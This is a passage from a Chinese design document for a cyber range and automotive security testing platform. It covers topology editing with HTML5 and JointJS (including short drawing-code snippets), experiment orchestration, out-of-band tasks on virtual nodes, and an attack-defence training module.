拓扑编辑界面功能</p><p>在拓扑编辑界面上，系统的设计确保用户能够清楚地看到虚拟机之间的连线信息，包括但不限于相关端口的两端IP地址。这种展示方便了用户在构建或修改虚拟网络环境时，对网络的连接关系有较好的认知。</p><p>系统还提供了功能强大的网络拓扑查看工具，使得用户不仅能够在图形化界面上审视整体的网络结构，还能深入每个节点和子网，查看它们的详细属性。这些属性可能包括：</p><p>部署情况：用户可以查看每个节点的软件和服务配置，确认是否符合预定的部署方案。</p><p>端口情况：用户可以审视每个节点或子网的端口状态，包括端口编号、协议类型以及端口的开放或关闭状态。</p><p>这些功能使得网络管理员能够更加高效地管理和监控整个虚拟环境，确保网络配置的准确性，并及时地调整和解决网络中的各种问题。</p><p>5. 操作记录撤回与模板功能</p><p>操作记录撤回将支持网络节点位置记录和配置记录，支持记录拓扑修改和节点配置修改，支持配置操作撤回，支持撤回步数不少于5步。系统还支持将整个场景拓扑或者区域子网络拓扑保存成模板，并且能够利用多个模板快速组合设计网络。支持将模板导出成json格式文件进行保存。场景模板的导入支持严格校验模板配置，也支持仅导入拓扑结构。</p><p>6. 设备复制与集群批量创建功能</p><p>模块支持设备复制的功能实现已配置设备的快速配置，复制的设备支持自动配置连线、设备名称、IP等信息。系统支持通过集群的方式实现利用主机模型批量创建多个类似的虚拟主机，批量创建的虚拟主机支持自动配置设备名称、IP等信息，单个集群支持批量创建的虚拟主机数量不低于1000个；支持批量对主机的配置进行修改，修改的信息包括虚拟机镜像、配额、IP等属性。</p><p>7. 性能参数</p><p>系统支持大规模拓扑的设计，单一拓扑支持不低于5000节点配置能力，支持的网络嵌套层级不低于3层，单个网络场景内子网络数量不低于100个，隔离网络数量不低于1000个。同时，系统支持同时配置的网络场景数量不低于200个。</p><h5 id="试验步骤配置"><a href="#试验步骤配置" class="headerlink" title="试验步骤配置"></a>试验步骤配置</h5><p>系统支持10万级节点试验步骤配置能力，并能适应后续规模扩展要求。试验步骤配置主要支持试验任务的分解与分派，包括子任务与前置任务的管理；支持试验任务的调度管理与进度管理以及试验人员的操作行为后台录制的配置管理；支持试验人员的操作行为后台录制和录制管控；支持录屏视频的回放与删除。支持试验的开放并允许试验人员登录试验环境中的主机，支持停止并中断试验人员对试验环境中的主机的访问。支持对试验的开始、暂停、恢复、结束等指令的控制。设计人员可以在试验进行中的任意时刻启动暂停，对试验做出指导。</p><p>系统支持带外执行命令脚本任务配置。配置参数包括操作系统、指令、参数、设备以及描述等字段。并能根据配置执行相关命令。带外执行命令脚本任务支持将操作系统、指令等参数单独提供为配置模板，进行存储。其中模板支持多种权限进行管理（私有、共享）以及导入、导出 。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b312f96a57bdee2fac1029789bcf42a8.png"></p><p>带外执行脚本</p><h6 id="文件写入任务"><a href="#文件写入任务" class="headerlink" title="文件写入任务"></a>文件写入任务</h6><p>系统支持文件写入任务配置。配置参数包括操作系统、写入路径、写入方式（追加、覆盖）、写入分类以及设备（名称、IP、系统）。文件写入任务支持将操作系统、写入路径、写入方式等参数单独提供为配置模板，进行存储。其中模板支持多种权限进行管理（私有、共享）以及导入、导出。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/960323d7ec2f78f152ebfa1e3992c2cd.png"></p><p>写入任务配置</p><h6 id="文件读取任务"><a href="#文件读取任务" class="headerlink" title="文件读取任务"></a>文件读取任务</h6><p>支持文件读取任务配置。配置参数包括操作系统、读取路径、读取周期、发送KAFKA配置（地址、TOPIC）、设备以及描述等字段。同时，支持将操作系统、读取路径等参数单独提供为配置模板，进行存储。其中模板支持多种权限进行管理（私有、共享）以及导入、导出。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2b1964c3c089b79abcb198b3daa2a517.png"></p><p>文件读取任务</p><h6 id="拓扑绘制"><a href="#拓扑绘制" class="headerlink" title="拓扑绘制"></a>拓扑绘制</h6><p>随着B/S移动计算的普及，笔记本、平板和手机等家电的整合，各种设备都有专有的计算，其中包括Android、微软、苹果、Flash等，它们在发展的过程中都暴露出自己的缺点和瓶颈。对开发者而言，大多数情况中开发的应用只能适用于单一平台，必须投入巨大精力才能保证应用的兼容性。这种情况限制了开发者的创造力，也限制了用户们的选择。但是，HTML5的出现解决了上述问题。互联网巨头们最终达成一致，共同开发和发展HTML5新技术。系统需要实现拓扑图的绘制和编辑，HTML5可以解决系统的需求。HTML5有着良好的跨越浏览器支持的标准、具有本地存储、脱机运作、基于GPS的地理定位、绘图、视频和多媒体等优点，无论是传统B/S架构应用还是最新移动领域的应用，它都提供了丰富而全面的支持。</p><p>系统中网络拓扑图绘制中心面板是用HTML5 Canvas实现的，面板中实现了拓扑图的更新、设备的拖动(包括ROUTER、ApplicationServer、Switch和WinXP等）、连线绘制和删除。在提交实验和结束实验之后，还要更新各个设备的属性信息。如果不采用HTML5，想要在浏览器中实现绘制网络拓扑结构图，在实现上有三种方案可供选择。</p><p>方案1：VML技术，VML是微软的技术标准，它相当于IE浏览器里面的画笔，通过它可以绘制自己想要的图形，结合脚本它可让图形制作出动态效果。虽然它是基于XML标准并能够绘制高质量的矢量图形，但VML只能运行于基于内核的浏览器。</p><p>方案2：SVG技术，和方案l相反的是，SVG是W3C制定的浏览器矢量绘图标准，但是在IE中必须安装指定的插件才能支持SVG。</p><p>方案3：Flex开发技术，用Flex生成的Flash具有较强的图形效果，同样，它也是需要Flash的插件才能支持在浏览器中执行Flash格式。可见，HTML5能够克服以上缺点，它是一个标准，不需要安装指定插件就可以在浏览器中得到支持，并且能够满足系统的需求。</p><p>系统中实验主面板中的元素由Canvas绘制而成。首先在Layout页面上插入Canvas元素创建一个空白矩形区域，一般要在创建的时候设置它的width和height元素，然后就可以通过API对它进行操作。和&lt;div&gt;元素类似，它形成了一个白色空白区域，但是两者的用途不同。然后通过getContext方法(Canvas要调用的第一个方法）获取画布面板的上下文，之后所有的操作都是在此上下文上的操作。CNEP中用到了HTML5的拖放API，用户可以从左侧设备元素栏选择需要的网络设备并把它们拖放到右侧的实验主面板中，在Canvas中绘制此网络设备图形。最后通过在Canvas上面绘制直线来完成设备间的连线，同时还可以在画布面板上面拖动设备元素。</p><p>目标网络的拓扑绘制通过界面拖拽完成，可以对网络节点进行增、删、改等操作。实物网络节点的设计和配置统一采用四种尺度节点，并支持通过鼠标拖拽的方式动态组网。同时，可以通过鼠标拖曳的方式将非虚实互联的实物节点描述到目标网络设计中。</p><p>系统提供强大的功能，支持通过拖拽操作，将网络拓扑内的节点灵活组网与配置。不论是虚拟网络设备、虚拟主机设备还是实物设备，都可以轻松进行操作和设置。主机的配置方面，系统提供了丰富的选项，包括基础信息、系统信息和网络信息，以满足各种需求。 拓扑工具提供设备编组和解除编组的功能，使得管理和调整设备位置变得更加便捷。系统提供了一系列对齐工具，能对设备进行多种对齐操作，包括上下左右对齐及水平垂直居中，还能够进行水平和垂直的均匀分布，以确保网络拓扑的整齐和美观。为了优化工作流程，将整个网络场景或特定子网络的拓扑结构保存为模板，这些模板可以互相组合，以便快速设计网络。模板可以导出为JSON格式，简化了数据的保存与分享过程。在导入模板时，系统会进行详尽的配置审核，以保证拓扑结构的准确性。根据需要，您还可以选择仅导入拓扑架构并根据实际需求进行自定义。系统还支持通过集群模式批量创建虚拟主机，允许您使用主机模型来实现快速部署，并且这些虚拟主机的配置，如设备名称、IP地址等，都可以自动设定并根据需要灵活调整。另外，系统也提供了批量修改主机配置的功能，方便地修改虚拟机镜像、配额、IP等属性，从而满足不同场景的需求。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/69c5ada81128bf3801a013905f38cc6c.png"></p><p>网络拓扑构建</p><h6 id="可视化编辑模块"><a href="#可视化编辑模块" class="headerlink" title="可视化编辑模块"></a>可视化编辑模块</h6><p>为了让管理员更好地通过拓扑图管理子系统进行集中管理，用户管理界面最好能够提供网络拓朴图，实时显示整个网络的安全状况，使管理员可以便捷地查看各安全产品组件的状态、日志以及信息处理结果，产生安全趋势分析报表。因此可视化管理技术的研究与应用尤为重要。可视化编辑子系统提供复杂虚拟网络定制的界面，支持基于可视化创建网络拓扑图、根据其他模块所创建和配置的网络元素、虚拟机模板、实例以及虚拟网络等元素，在界面上按照要求拖动需要的元素，然后连线构件各个元素之间的关系。</p><p>本项目的可视化编辑模块用的可视化编辑工具是JointJS。JointJS是一个跨浏览器的JavaScript工具包，用于创建完全互动式图表。它基于Raphaël.js开发。这个工具包拥有一套基于插件的可扩展机制，可以轻松扩展现有功能。支持多人并行编辑和配置。</p><p>JointJS是一个跨浏览器的JavaScript工具包，用于创建完全互动式图表。这个工具包拥有一套基于插件的可扩展机制，可以轻松扩展现有功能。当前已经提供了一些可以马上使用的插件来绘制常见的图形包括：ERD、Org chart、FSA、UML、PN、DEVS、LDM等。图形中的对象可以被拖动，并能够保持创建时的层次结构，此外还在每一层级提供了一些回调函数。网络拓扑编辑的操作如下图所示。网络拓扑支持图分层式节点聚合和滚动式缩放，在节点的数量上支持等于10000个节点的编辑。对编辑完成的拓扑图可支持导入导出的操作，支持网络拓扑图保存为一个可重复使用的模板。系统允许您通过鼠标拖拽或点击来选择设备、配置其属性和编辑设备间的连接关系，同时支持保存和加载这些配置。网络配置以模板的形式进行存储，并配备了一个针对标准网络目标或实验场景的配置模板库，用于简化和加速配置过程。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ba728525bf95c17c3b222c9244d16fb2.png"></p><p>网络拓扑可视化编辑</p><p>JointJS应用在本项目的可视化编辑模块主要用到一下功能。</p><p>加载JointJS库</p><p><a href="http://www.jointjs.com/download">官网</a>中下载joint.js和joint.css或其他已经定义好的图形库，并在页面中添加。</p><p>创建画板</p><p>首先需要一张可以在上面作画的纸，JointJS中一个图像模型就是一个joint.dia.Graph 的模型实例，其他的子模型都必须包含其中,但单单定义图像模型还不够，只有将图像模型附加到joint.dia.Paper模型中，才能显示对应的图像，Graph就像是在脑子中的构思一样，需要将他画在纸Paper上。实现画板的代码如下：</p><p>var graph=new joint.dia.Graph;</p><p>var paper=new joint.dia.Paper({</p><p>el:$(“#demo”）, //指明了当前图像需要显示在页面的什么地方</p><p>width:800,</p><p>height:600,</p><p>gridSize:10,</p><p>perpendicularLinks:true,</p><p>model:graph</p><p>}）;</p><p>添加连线</p><p>JointJS通过joint.dia.Link添加一个连线；每个实例对象都是graph模型的cell，必须通过graph.addCell(）添加到模型中以便显示出来。除了初始化外，也可以通过 element.attr(）方法去为特定的对象添加样式，element.attr(）的方法接受一个对象类型的参数，对象的Key是匹配SVG DOM元素的CSS选择器。实现连线的代码如下：</p><p>var link=new joint.dia.Link({</p><p>attrs: {</p><p>‘.connection’: { stroke: ‘#000000’ },</p><p>‘.marker-target’: { d: ‘M 10 0 L 0 5 L 10 10 z’ }</p><p>},</p><p>source: { x:325,y:150},</p><p>target: {x:400,y:125}, vertices:[{x:100,y:150},{x:100,y:450},{x:700,y:450},{x:700,y:150},{x:600,y:150},{x:600,y:50},{x:400,y:50}]</p><p>}）;</p><p>添加元素</p><p>利用JointJS已经定义的元素实现网络拓扑图中比较简单的元素，例如主机等。</p><p>添加自定义元素</p><p>很多时候，现有的元素(joint.shapes.basic.Rect、 joint.shapes.basic.Circle、……）并不能满足需求，可以自定义一些元素，自定义的元素其实是通过多个 SVG节点联合构建而成的，现在先定义一个路由器元素，网络拓扑图中的路由器为一个圆形及两条相交的线段构成的图形。实现路由器元素的js代码如下：</p><p>var k=12.5*Math.pow(2,0.5）;</p><p>joint.shapes.basic.Bulb = joint.shapes.basic.Generic.extend({</p><p>markup: ‘’,</p><p>defaults: joint.util.deepSupplement({</p><p>type: ‘basic.Bulb’,</p><p>size: { width: 50, height: 50 },</p><p>attrs: {</p><p>circle: { cx: 25, cy: 25,r:25, fill: ‘white’, stroke: ‘black’},</p><p>‘.bulb_line1’:{</p><p>stroke: ‘black’,x1:25-k,y1:25-k,x2:25+k,y2:25+k</p><p>},</p><p>‘.bulb_line2’:{</p><p>stroke: ‘black’ ,x1:25-k,y1:25+k,x2:25+k,y2:25-k</p><p>}</p><p>}</p><p>}, joint.shapes.basic.Generic.prototype.defaults）</p><p>}）;</p><p>目标网络环境的网络拓扑编辑提供了诸多功能：树形展示使得快速查找和定位节点变得简单，同时支持通过虚拟机名称搜索定位；鹰眼展示功能可以放大缩小拓扑图并保持位置同步移动；滚动式缩放与分层式节点聚合提升了拓扑编辑的灵活性和可视化效果；目录展示和快速查找节点功能有助于有效管理复杂网络；设备复制功能支持快速复制和配置设备；多选与移动功能使得批量操作更加高效；展示虚拟机连线的IP地址增强了连接的可视化；分组和解组功能以及节点和子网属性的查看提供了更详细的信息；拓扑编辑界面记录节点和配置的修改，并支持配置操作撤销；旁路设备的配置实现了指定端口流量的便捷管理。</p><h3 id="试验导调模块"><a href="#试验导调模块" class="headerlink" title="试验导调模块"></a>试验导调模块</h3><h4 id="功能实施方案-13"><a href="#功能实施方案-13" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>系统支持试验流程中的步骤详细定义，支持创建试验流程步骤，允许用户定制每个步骤的详情、测试用例、前置条件等信息，并且支持用户在步骤中明确需要执行的导调任务，将导调任务作为流程和步骤的一部分，进行描述、定义，用户在执行试验流程过程中的相应步骤中，会开展定义需要执行的导调任务。</li></ol><p>该模块包含以下15种流程的创建：攻防演练流程、众测流程、安全目标导入流程、零部件测试流程、整车测试流程、HIL测试流程、VIL测试流程、MCU靶标开发流程、MPU靶标开发流程、E/E架构通信网络靶标开发流程、车联网安全场景靶标开发流程、应急响应流程、漏洞验证流程、周期性测试流程、运维管理流程。</p><p>同时，该模块能够定义这些流程中各个步骤与汽车研发流程中各个环境步骤的关系，从而能够显示这些流程与汽车研发流程的关联关系，有助于用户更好地理解试验过程与汽车研发的关系。详见“产品功能截图”部分。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5ae59accb8a060e5cd2a9a5c6fc5dc4f.png" alt="IMG_256"></p><p>实验流程步骤定义</p><p>2） 系统支持试验过程流程的设计，允许用户将整个试验过程拆解成有序的步骤，以便更好地管理和控制试验的复杂性。每个步骤都可以用于构建试验过程中的前提条件，用户可以将试验过程中依赖的前提条件通过流程中设计的步骤进行构建，使得试验过程更加清晰和可控以确保试验的顺利进行。这种流程化的设计方式有助于提高试验过程的可重复性和可扩展性，为后续的试验提供了清晰、标准的操作指导。</p><p>3） 系统具备试验过程流程及进度的控制功能，能够对试验过程的流程和进度进行控制，用户可以监控试验的进度并控制各个步骤的执行，确保按照预先编排制定的顺序有序执行，提高试验的可重复性和可管理性。</p><p>4） 用户具备设置任务执行方式的能力，可以根据实际需求进行配置，选择人工执行或自动执行，以满足不同的操作场景和要求。这种灵活性满足了不同试验场景的需求，用户可以根据实际情况选择合适的任务执行方式，提高了试验的可定制性和适应性。</p><p>5） 系统支持导调任务的灵活编排，包括上移和下移等操作，使用户能够根据需要微调任务的执行顺序。满足用户更大的操作灵活性，以便更好地管理试验流程。</p><p>6） 在导调步骤中，用户有能力添加临机任务，并单独启动或停止这些任务，以便控制试验过程，确保实验按计划进行。这种功能为用户提供了更大的操作空间和灵活性，使得用户可以根据实际需要加入临机任务，并进行控制和管理，提高了试验的针对性和有效性。</p><p>7） 系统支持向临机任务下发控制指令，每个试验场景可容纳不少于10条临机任务的下发，支持模拟实际攻击事件，为试验提供更真实的环境。这种功能满足了用户对临机任务的管理和控制需求，确保了试验场景的有效性和完整性，提高了试验的真实性和模拟度。</p><p>8） 用户可以向临机任务下发多种控制指令，包括启动、停止、恢复和下一步等，以实现任务控制，从而满足试验中不同阶段的需求，更好地管理和调度试验任务。用户可以根据实际需求对临机任务进行控制和管理，提高了试验的可控性和灵活性。</p><p>9） 导调任务支持自动化相关行为，用户具备自定义自动化命令的能力，可用于模拟攻击事件，用于攻防技能训练。这一功能使得导调过程更加高效和准确，有助于提高攻防技能训练的效果。支持在导调过程中加入临机任务进行灵活导调的功能进一步增强了模块的实用性和便捷性。</p><p>10） 系统支持在导调过程中加入临机任务进行灵活导调。用户可以根据需要添加临机任务，并对这些任务进行独立的导调和控制操作，以满足特定的导调需求和场景。</p><p>11） 系统提供任务执行的启动和停止操作，确保用户能够随时完全掌控试验过程，以便在需要时进行及时的干预和管理，增加了试验的可控性和安全性。</p><p>12） 系统支持导调流程顺序和执行状态的展示，包括步骤类型、开始结束方式、创建人、创建时间等信息。用户可以查看导调流程的顺序和执行状态，及时了解试验的进展情况。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d9b47c352925b26a8148e047b94b386b.png" alt="IMG_256"></p><p>13） 虚拟节点具备强大的非网络接口能力，能够通过该接口将配置文件或命令脚本写入虚拟节点指定位置，并实时读取虚拟节点内部日志或文件，以及通过非网络接口控制虚拟节点执行命令或脚本，并获取执行结果，为试验任务提供了更高的自动化和控制性能。</p><p>14）系统支持导调控制引擎，具备对导调任务的启停控制功能，通过任务调度和状态监测确保任务按计划有序执行，高度优化的任务调度算法和任务状态监测机制保证了任务的可靠性和准确性。</p><p>15）系统支持多种自动化相关行为，用户可以定义自动化命令执行任务，模拟各种攻击事件，用于实际攻防技能的训练和演练，强大的自动化脚本引擎和攻击模拟工具保证了任务的高度真实性和可行性，同时提供丰富的自定义选项，满足不同训练需求。</p><p>16） 导调数据通道任务能够建立指定虚拟网络到外部管理网络的数据交互通道，支持TCP、UDP、ICMP等多种协议，以便实现试验行为或结果的高效获取。</p><p>17）系统支持在导调任务中对试验人员能够操作的虚拟或实物设备进行配置，并支持根据具体试验情况是否开启录屏。这种功能为用户提供了更多的自定义选项，使用户能够根据实际需求对试验设备进行配置和管理，同时通过录屏功能记录试验过程，方便后续的分析和评估</p><h4 id="性能实施方案-13"><a href="#性能实施方案-13" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 每个导调流程能够支持15个步骤，每个步骤支持15个任务的执行能力，确保系统能够应对复杂多样的试验需求。使得导调过程更加有序和高效。</p><p>2） 系统具备良好的性能优化设计，能够支持同时配置和调度120个任务，以确保系统能够高效管理大规模试验和训练活动，满足用户的需求。</p><h4 id="技术实现内容-13"><a href="#技术实现内容-13" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数为，系统支持试验流程中步骤的详细定义，包括在步骤中定义具体需要执行的导调任务。系统能创建15种流程，如攻防演练、众测、安全目标导入等，并显示这些流程与汽车研发流程的关联。试验过程流程的设计可以将整个试验拆解为一系列有序步骤，并构建试验中依赖的前提条件。系统还控制试验过程流程及进度，确保训练过程按顺序运行。</p><p>系统支持设定任务执行方式，可为人工或自动执行，并允许在流程中进行导调任务的顺序编排。导调步骤中可加入临机任务，并对其进行单独启动和停止控制。支持向临机任务下发控制指令，每个试验场景支持下发10条临机任务。导调任务还支持控制自动化相关行为，通过自动化命令执行任务产生攻击事件，用于攻防技能训练。</p><p>系统在导调过程中可加入临机任务进行灵活导调，支持对任务执行的启动、停止操作。导调流程顺序、执行状态的展示功能包括步骤类型、开始结束方式、创建人、创建时间等信息展示。虚拟节点通过非网络接口写入配置文件或命令脚本，实时读取内部日志或文件，并控制执行命令或脚本。</p><p>导调控制引擎支持对导调任务的启停控制，导调数据通道任务能建立指定虚拟网络到外部管理网络的数据交互通道，支持多种协议。系统允许在导调任务中配置试验人员操作的虚拟或实物设备，并根据试验情况开启录屏。</p><p>性能参数为，系统在一个导调流程中支持10个步骤，每个步骤可执行10个任务。系统能够同时配置和调度100个任务，确保高效率和灵活性的试验和导调过程。</p><h5 id="方案设计-2"><a href="#方案设计-2" class="headerlink" title="方案设计"></a>方案设计</h5><p>1. 试验流程定义与管理</p><p>本系统支持试验流程中的步骤详细定义，允许用户在步骤中定义具体需要执行的导调任务。系统包含以下15种流程的创建功能：</p><p>1）攻防演练流程</p><p>2）众测流程</p><p>3）安全目标导入流程</p><p>4）零部件测试流程</p><p>5）整车测试流程</p><p>6）HIL测试流程</p><p>7）VIL测试流程</p><p>8）MCU靶标开发流程</p><p>9）MPU靶标开发流程</p><p>10）E/E架构通信网络靶标开发流程</p><p>11）车联网安全场景靶标开发流程</p><p>12）应急响应流程</p><p>13）漏洞验证流程</p><p>14）周期性测试流程</p><p>15）运维管理流程</p><p>并且系统能够显示这些流程与汽车研发流程的关联关系。</p><p>2. 试验过程流程设计与管理</p><p>系统支持试验过程流程的设计，能够将试验的整个过程拆解成一系列有序的步骤进行管理，并能够将试验过程中依赖的前提条件通过流程中设计的骤进行构建。</p><p>3. 试验过程流程及进度控制</p><p>系统支持试验过程流程及进度的控制，并能够控制训练过程按照编排的顺序有序的运行。</p><p>4. 任务执行方式设定</p><p>系统支持设定任务的执行方式，能够设定为人工或者自动执行。</p><p>5. 导调任务执行顺序编排</p><p>系统支持流程中导调任务的上移、下移等执行顺序的编排操作。</p><p>6. 临机任务管理</p><p>系统设计中集成了灵活的任务调度和控制功能，以便在导调（演练和练习的指挥与控制）过程中，即时添加和管理临机任务。这项功能针对的是在预配置的试验或操作场景中突然出现需要立即响应的任务，确保即使在复杂的操作中也能保持高度的适应性和响应速度。</p><p>特别是，系统提供了对临机任务的单独启动和停止控制。这些任务可以独立于主流程进行管理，允许用户在不影响整体流程的前提下，启动或暂停特定的任务。</p><p>每个试验场景都支持最多10条临机任务的下发。系统通过一个用户界面或控制台，允许用户指定、排队和下发这些任务，提供了实时的灵活性。对于管理这些临机任务，系统支持的控制指令包括，但不限于：</p><p>- 启动：让选定的临机任务开始执行。</p><p>- 停止：暂停或完全终止临机任务的执行。</p><p>- 恢复：在任务被暂停后恢复执行。</p><p>- 下一步：将任务流程推进到下一阶段或步骤。</p><p>7. 自动化导调任务</p><p>导调任务支持控制自动化相关行为，能够通过定义自动化命令执行任务产生相关攻击事件，用于攻防技能训练。</p><p>8. 导调流程管理</p><p>系统支持导调流程顺序、执行状态展示，还包含显示步骤类型、开始结束方式、创建人、创建时间等信息，并提供产品功能截图证明。</p><p>9. 虚拟节点非网络接口操作</p><p>虚拟节点能够通过非网络接口将配置文件或命令脚本写入虚拟节点指定位置；能够通过非网络接口实时读取虚拟节点内部日志或文件；能夜通过非网络接口控制虚拟节点执行命令或脚本，并能获取执行结果。</p><p>10. 导调控制引擎</p><p>支持导调控制引擎对导调任务的启停控制。</p><p>11. 导调数据通道任务</p><p>导调数据通道任务能够建立指定虚拟网络到外部管理网络的数据交互通道，便于试验行为或者结果的获取。数据通道支持TCP、UDP、ICMP等3种以上协议。</p><p>12. 试验设备操作配置</p><p>支持在导调任务中对试验人员能够操作的虚拟或实物设备进行配置，并支持根据具体试验情况是否开启录屏。</p><p>性能设计</p><p>1个导调流程中支持10个步骤，每个步骤支持10个任务的执行能力；</p><p>支持同时配置和调度100个任务。</p><h5 id="方案简介"><a href="#方案简介" class="headerlink" title="方案简介"></a>方案简介</h5><p>安全测试包括以下三个阶段：a）试验准备阶段：主要完成试验想定以及环境部署等； b）试验运行阶段：主要是对试验状况的监控以及对试验的控制；c）试验完成阶段：主要完成资源的释放以及对试验数据的归档。</p><p>试验导调模块提供试验创建、试验查看、试验想定、试验下发、试验部署进度监控、试验过程控制和监视、试验归档等功能的资源调度，总体要求如下： a） 提供面向多靶场协同工作的试验演练的统一管理，提供多靶场协同的试验演练并发调度；b） 提供靶场能力、靶标及场景资源、攻防工具资源等的统一描述；c） 提供面向多靶场协同的各类资源注册和管理； d） 提供面向多靶场的任务全生命周期的实时监控能力； e） 支持多靶场协同的想定方案快速生成、校验和资源预约； f） 支持多靶场协同试验的统一控制：支持分布式统一资源管理和试验控制，支持对分靶场的资源进行统一管理，支持接收来</p><p>试验导调模块负责用户对任务的资源和人力的分配，支持试验人员的加入及试验环境的授权访问，支持试验人员退出及取消实验环境的访问权限；支持试验人员的试验信息的访问控制和试验环境的访问控制；每个试验的参试用户在200个以上。</p><p>虚拟节点支持通过非网络接口进行操作，包括将配置文件或命令脚本直接写入到指定位置，实时读取节点内的日志或文件。还可以通过同一接口执行控制指令或脚本，运行命令，并实时获取这些操作的执行结果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/07b67a317a0ed98d753270274958c912.jpeg" alt="WPS图片3"></p><p>试验文件管理</p><p>客户端登录后控制中心获取其认证信息，认证通过后下发当前客户端用户的授权信息（角色）及链路使用规则，然后根据用户提交的角色需求控制中心动态规划出符合用户需求的链路发往客户端。客户端根据该链路创建链路并进行匿名会话，若创建失败，客户端会标记出现异常的节点，上报至控制中心。试验的开放并允许试验人员登录试验环境中的主机，支持暂停与停止并中断试验人员对试验环境中的主机的访问。</p><p>虚拟网络导调子系统支持基于容器化部署，可通过Web页面查看系统信息，包括监控系统集群节点负载情况，节点状态以及节点资源使用率统计，监控平台容器Pod的虚拟节点具备通过非网络接口与虚拟节点进行交互的能力。包括利用非网络接口将配置文件或命令脚本写入虚拟节点的特定目录中，这样做便于对虚拟节点进行灵活的配置和管理。另外，虚拟节点还可以通过非网络接口实时读取节点内部的日志或文件，实现对节点运行状态的实时监测与数据收集；实现通过非网络接口控制虚拟节点或脚本、执行命令，并获取执行结果，并能获取执行结果（提供系统功能截图）；状态、运行时间、重启次数、CPU使用核数，内存使用情况等信息如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3b8c64f1d0a5ca57a3c41578f9a29d17.png"></p><p>虚拟节点导调管理</p><p>支持试验流程的详细定义和管理。用户可以定义试验步骤，并在每个步骤中定义具体的导调任务，以实现对试验过程的控制和管理。试验流程可以将整个试验过程拆解为有序的步骤进行管理，通过设计的步骤可以构建试验过程中的前提条件和依赖关系。系统支持对试验流程和进度进行控制，确保训练过程按照预定顺序有序运行。用户可以设定任务的执行方式，可以选择人工或自动执行。导调任务可以在流程中进行灵活编排，支持上移、下移等操作。临机任务可以单独启动和停止，并在界面上进行可视化展示和高亮显示。用户可以向临机任务下发控制指令，如启动、停止、恢复、下一步等。导调任务在系统中提供自动化控制功能，允许用户通过设置自动化命令来执行特定的任务，包括模拟攻击事件，以便开展攻防技能的培训。系统设有导调数据通道，能够建立虚拟网络与外部管理网络之间的数据交换通道，这有利于捕获实验行为和成果，并且支持包括TCP、UDP、ICMP在内的多种协议。系统还提供了一系列配置选项，包括数据采集、实验设备设置和录屏功能，以适应不同的实验场景。导调任务的整个流程、顺序以及执行状态都有展示，显示了任务步骤、启动结束方式、创建者和时间等详细信息。导调控制引擎则负责任务的启动和终止。系统以其强大和灵活的功能，支撑详细的试验流程定义和控制，使用户能够有效进行攻防训练和模拟演习。</p><h3 id="网络安全攻防与汽车测评教学培训模块"><a href="#网络安全攻防与汽车测评教学培训模块" class="headerlink" title="网络安全攻防与汽车测评教学培训模块"></a>网络安全攻防与汽车测评教学培训模块</h3><h4 id="功能实施方案-14"><a href="#功能实施方案-14" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 提供的测评教学培训模块支持实验自定义，用户可以根据需求自定义实验，并对实验和课程进行标签分类。此外，该模块还支持课程按照章节编排实验，使得课程内容更加系统化和组织有序。</p><p>2） 提供的模块支持集中授课培训模式，允许教员进行讲课、学员进行实操，以及讲课与实操混合三种方式的教学。这种模式满足了不同培训需求，有助于提高教学效果和学员的实践操作能力。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ce55362ab958f1eaf6bbc7dde90ed4f8.png"></p><p>教员讲课及讲课与实操</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0661323118c6079b9aeb22b5886f9461.png" alt="1703512451886"></p><p>学员实操界面</p><ol><li>该模块支持学员管理功能，教员可以组建并管理教学组，根据教学计划排定教学计划。这为教员提供了方便的管理工具，使得学员管理更加高效和有序。</li></ol><p>4） 该模块支持实验环境按照排定的计划自动部署，同时教员也可以手动对实操环境进行批量部署与管理。这种功能为用户提供了更多的灵活性，可以根据实际需求进行环境部署和管理。</p><p>5） 在教员讲课模式下，该模块支持教员分享操作屏幕给学员观摩，方便学员了解课程内容和实践操作。</p><p>6） 具备监控能力，在实操模式下，教员能够实时查看学员登录实验环境的情况和操作过程，有助于及时了解学员的学习情况和提供针对性的指导。</p><p>7） 混合模式支持讲课模式与实操模式的动态切换，学员可以观摩教员的教学虚拟机界面，切换后学员可以登录自己的环境进行操作。这种功能兼顾了理论学习和实践操作的需求，提高了教学效果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a28d25c35c3a7c287ed68ccfe387d167.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3ee612cc75ff7584cbf93367e9801f83.png" alt="IMG_256"></p><p>观摩模式/ 